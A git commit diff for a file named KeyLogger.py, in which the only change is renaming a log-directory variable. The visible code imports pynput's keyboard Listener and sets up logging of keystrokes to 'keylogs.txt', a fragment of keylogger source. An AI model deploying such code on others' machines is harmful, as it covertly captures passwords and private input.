9d30d3d9128dbb8f81343e3b33c389fe482de6dc
Ayan Saha <55869014+AyanSaha25@users.noreply.github.com>
2021-10-08 08:55:33 +0530

    KeyLogger

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,9 +1,9 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = ""
+log_dire = ""
 
-logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+logging.basicConfig(filename=(log_dire + "keylogs.txt"), \
 	level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
